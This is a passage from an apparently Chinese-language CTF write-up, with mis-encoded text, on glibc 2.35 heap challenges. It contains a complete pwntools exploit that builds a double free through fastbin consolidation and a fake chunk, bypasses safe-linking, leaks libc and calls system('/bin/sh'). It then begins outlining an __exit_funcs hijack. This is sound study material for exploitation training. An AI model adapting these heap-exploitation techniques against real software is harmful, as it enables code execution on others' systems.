chunk</code>å°±å¯ä»¥ä»»æ„ä¿®æ”¹bufæŒ‡é’ˆå®Œæˆä»»æ„free è¿™æ ·æˆ‘ä»¬å¯ä»¥è½»æ¾æ„é€ ä¸€ä¸ªdouble free å®ç°ä»»æ„å†™æ“ä½œ</p></blockquote><ul><li><p>è§¦å‘fastbinçš„åˆå¹¶</p><ul><li>æˆ‘ä»¬å¯ä»¥è®©<code>head chunk</code>è¿›å…¥fastbiné“¾ä¸­ ç„¶åé€šè¿‡ç”³è¯·ä¸€ä¸ªlargebin chunkè§¦å‘åˆå¹¶æœºåˆ¶ ç„¶åè®©è¿™äº›chunkåˆå¹¶è¿›å…¥unsortedbin æˆ‘ä»¬å†ç”³è¯·ä¸º <code>content chunk</code>è¿™æ ·æˆ‘ä»¬å¯ä»¥å¯¹è¿™äº›åŸæœ¬çš„head chunkè¿›è¡ŒåŠ«æŒ</li></ul></li><li><p>æ„é€ double free</p><ul><li>ä»»æ„free è®©fastbiné“¾ä¸­ç¬¬äºŒä¸ªchunk freeæ¥è§¦å‘double free åŠ«æŒbssæ®µæ•°æ®</li></ul></li></ul><h3 id="è„šæœ¬-2" tabindex="-1"><a class="header-anchor" href="#è„šæœ¬-2" aria-hidden="true">#</a> è„šæœ¬</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
<span class="token comment"># context.terminal = [&#39;byobu&#39;, &#39;sp&#39;, &#39;-h&#39;]</span>


<span class="token comment"># file_name = &quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">64814</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+34&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk data: &quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\næ·»åŠ indexä¸º:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">çš„chunk\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\nåˆ é™¤indexä¸º</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">çš„chunk\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res
<span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;114514&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span>  <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;éé¢„æœŸæ•°æ®&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># fastbin çš„åˆå¹¶æœºåˆ¶éœ€è¦ åœ¨ç”³è¯·large chunkæ—¶</span>

<span class="token comment"># åˆ›å»ºunsortedbinå¤§å°å æ»¡ å¹¶ä¸”å¤šä¸¤ä¸ªchunk</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 0x110å¤§å°chunk 8å·å°±æ˜¯æˆ‘ä»¬è¦ä¿®æ”¹çš„chunk</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>


<span class="token comment"># æ­¤æ—¶indexä¸º6çš„è·å–äº† å„ä¸ªé“¾çš„chunk</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è·å–ä¸€ä¸ªå¤§chunkè£…äº†heap&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
addr_slice <span class="token operator">=</span> getData<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># 0xae4400 - 0xae4000   0x1baf400</span>
base_heap <span class="token operator">=</span> addr_slice<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x400</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># x/10a &amp;chunk_list å‰6å·å æ»¡ ä½†æ˜¯å‰äº”ä¸ªisusedä¸º0</span>

<span class="token comment"># å¼€å§‹æ„é€ double free å…ˆæ˜¯å–å›æ‰€æœ‰çš„tcache å†å æ»¡tcache</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># æ­¤æ—¶fastbinæœ‰ä¸‰ä¸ª tcacheå æ»¡ æˆ‘ä»¬mallocä¸€ä¸ªå·¨æ— éœ¸ç„¶åå°±å¯ä»¥è¦†å†™fastbin fastbinæƒ…å†µ:0xacf8e0 â€”â–¸ 0xacf8c0 â€”â–¸ 0xacf8a0 â—‚â€” 0x0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;å æ»¡tcache&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># chunk_list[4] å¯¹åº” è¿™é‡Œpaloadåç§»32ä½ç½®</span>
<span class="token comment"># æ­¤æ—¶chunk_listä½¿ç”¨æƒ…å†µ: 6 7 å¤„äºä½¿ç”¨çŠ¶æ€</span>
<span class="token comment"># å¦‚æœfreeåˆ™æ˜¯free chunk_list[4] æ‰€ä»¥æˆ‘ä»¬è¦æ„é€ å¥½è¿™ä¸ªchunk è®©å®ƒç»•è¿‡å®‰å…¨æ£€æµ‹ æ‰€ä»¥æˆ‘ä»¬æ„é€ sizeå’Œprev_inuseä½ ç„¶åå†æ„é€ é‡Œé¢çš„fdè®©å®ƒæŒ‡å‘fastbin chunkä¸­ç¬¬äºŒä¸ªchunk</span>
fakechunk <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
<span class="token comment"># è¿™é‡Œéšæ„</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x20</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment"># çœ‹ä¸‹é¢çš„è§£é‡Š</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0xd10</span>
<span class="token comment"># è¦freeçš„æ˜¯:0x1279d00 é“¾å­:0x1279d20 â€”â–¸ 0x1279d00 å˜æˆ:0x1279d00 â€”â–¸ 0x1279d20 â—‚â€” 0x1279d00</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x430</span><span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;æˆåŠŸæ„é€ fake chunk \ndouble free çš„chunkæŒ‡é’ˆ:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># æ„é€ ä¸¤ä¸ªfastbinçš„æƒ…å†µ</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># fastbin:0x1603d20 â€”â–¸ 0x1603d00 heapbase:0x1603000 æ‰€ä»¥æ„é€ ä¸€ä¸ª0x1603d00è¢«freeçš„æƒ…å†µ</span>
<span class="token comment"># ç„¶åglibc 2.35ç‰ˆæœ¬ä¸‹æœ‰fdåŠ å¯† éœ€è¦:å †åœ°å€&gt;&gt;12ç„¶å ^æˆ‘æƒ³è¦æ„é€ çš„fd</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;æ„é€ æˆåŠŸä¸¤ä¸ªfastbinçš„æƒ…å†µ&quot;</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">&gt;&gt;</span><span class="token number">12</span><span class="token operator">^</span><span class="token number">0x404070</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> gift<span class="token punctuation">(</span><span class="token punctuation">)</span>

base_libc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x80E50</span>
system_addr <span class="token operator">=</span> base_libc <span class="token operator">+</span><span class="token number">0x50D70</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
gift<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ptmalloc2-it-s-myheap-pro-glibc2-35ä¸‹çš„exitå‡½æ•°æ‰“æ³•" tabindex="-1"><a class="header-anchor" href="#ptmalloc2-it-s-myheap-pro-glibc2-35ä¸‹çš„exitå‡½æ•°æ‰“æ³•" aria-hidden="true">#</a> ptmalloc2 it&#39;s myheap pro (glibc2.35ä¸‹çš„exitå‡½æ•°æ‰“æ³•)</h2><h3 id="å®¡é¢˜" tabindex="-1"><a class="header-anchor" href="#å®¡é¢˜" aria-hidden="true">#</a> å®¡é¢˜</h3><ul><li><p>addå‡½æ•° mallocä¸€ä¸ª0x18çš„chunk(0x20) å±æ€§åˆ†åˆ«å¯¹åº”:size isUsed buff å¹¶ä¸”ä»…åœ¨åˆ›å»ºçš„æ—¶å€™å¯ä»¥å†™å…¥æ•°æ® å¹¶ä¸”æ²¡æœ‰æ£€æµ‹è¿™ä¸ªindexæ˜¯å¦åœ¨ä½¿ç”¨ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹ä¸€ä¸ªindexæ— é™malloc</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418005442527.png" alt="image-20240418005442527" tabindex="0" loading="lazy"><figcaption>image-20240418005442527</figcaption></figure></li><li><p>deleteå‡½æ•° ç›´æ¥freeè®°å½•ä¿¡æ¯çš„chunkå’Œæˆ‘ä»¬çš„å†…å®¹ä½“chunk(buff) å¹¶ä¸”æ²¡æœ‰æ¸…ç©º</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418005502800.png" alt="image-20240418005502800" tabindex="0" loading="lazy"><figcaption>image-20240418005502800</figcaption></figure></li><li><p>viewå‡½æ•° ç›´æ¥writeå‡ºsizeå¤§å°çš„å†…å®¹ å­˜åœ¨æ³„éœ²</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418005523801.png" alt="image-20240418005523801" tabindex="0" loading="lazy"><figcaption>image-20240418005523801</figcaption></figure></li><li><p>atexitå‡½æ•°</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418131700409.png" alt="image-20240418131700409" tabindex="0" loading="lazy"><figcaption>image-20240418131700409</figcaption></figure></li></ul><h3 id="å¤§è‡´åˆ©ç”¨åŸç†" tabindex="-1"><a class="header-anchor" href="#å¤§è‡´åˆ©ç”¨åŸç†" aria-hidden="true">#</a> å¤§è‡´åˆ©ç”¨åŸç†:</h3><blockquote><p>è¿™é‡Œå…ˆç²—ç•¥å†™ä¸€ä¸‹åŸç† åé¢ç»†è®² æ•´ä¸ªåˆ©ç”¨åŸç†ä¸ç®—éš¾ä½†æ˜¯ç»†èŠ‚å¾ˆå¤šå¾ˆå¤šåœ°æ–¹éœ€è¦å¾®è°ƒ</p></blockquote><ul><li><p>æ³„éœ²libc heapåœ°å€</p><ul><li>é€šè¿‡malloc 9ä¸ª128 æ¥ç”³è¯·0x90å¤§å°çš„chunk ç„¶åfreeæ‰ è®©chunkè¿›å…¥unsortedbinä¸­ å†ç”³è¯·å›æ¥ é€šè¿‡writeå‡½æ•°ç›´æ¥æ³„éœ²libcåœ°å€ å’Œheapåœ°å€</li></ul></li><li><p>ä¼ªé€ fake chunkï¼ˆæ¶ˆè€—topchunkè§¦å‘fastbinçš„åˆå¹¶ï¼‰</p><blockquote><p>æˆ–è€…é€šè¿‡å‘scanfè¾“å…¥å¤§é‡æ•°æ®è§¦å‘fastbinåˆå¹¶ å› ä¸ºscanfåœ¨æ¥å—å¤§é‡æ•°æ®çš„æ—¶å€™ä¼šç”³è¯·ä¸€ä¸ªlargebin</p></blockquote><ul><li>å› ä¸ºé¢˜ç›®ä¸­å­˜åœ¨isUsed æœ‰äº†è¿™ä¸ªå°±é˜»æ­¢äº†æˆ‘ä»¬<code>double free</code>æ‰€ä»¥æˆ‘ä»¬è®©è®°å½•å¤´ä¿¡æ¯çš„chunkè¿›å…¥fastbinä¸­ å¹¶ä¸”é€šè¿‡æ¶ˆè€—ç©ºtopchunk è§¦å‘fastbinçš„åˆå¹¶æœºåˆ¶ è®©fastbinè¿›å…¥unsortedbinä¸­ å†é€šè¿‡åˆ†å‰²æœºåˆ¶ è®©åŸæœ¬çš„ä¿¡æ¯å¤´chunkæˆä¸ºæˆ‘ä»¬çš„å†…å®¹chunk(buff) é€šè¿‡å‘chunkå†™å…¥å†…å®¹æ¥åŠ«æŒä¿¡æ¯å¤´chunk æ”¹å†™isUsedå’ŒbuffæŒ‡é’ˆ æ¥å®ç°ä»»æ„åœ°å€çš„free ä»è€Œå®ç°double free</li></ul></li><li><p>åŠ«æŒ__exit_funcsé“¾è¡¨ å®ç°åœ¨exitçš„æ—¶å€™ä»»æ„å‡½æ•°çš„è°ƒç”¨ é€šè¿‡ä¸¤æ¬¡double free ç¬¬ä¸€æ¬¡æ³„éœ²tlsä¸­çš„key ç¬¬äºŒæ¬¡è´Ÿè´£ä¿®æ”¹__exit_funcsé“¾è¡¨</p><blockquote><p>å¤§æ¦‚æ€è·¯:<a href="https://www.anquanke.com/post/id/243196" target="_blank" rel="noopener noreferrer">exit()åˆ†æä¸åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 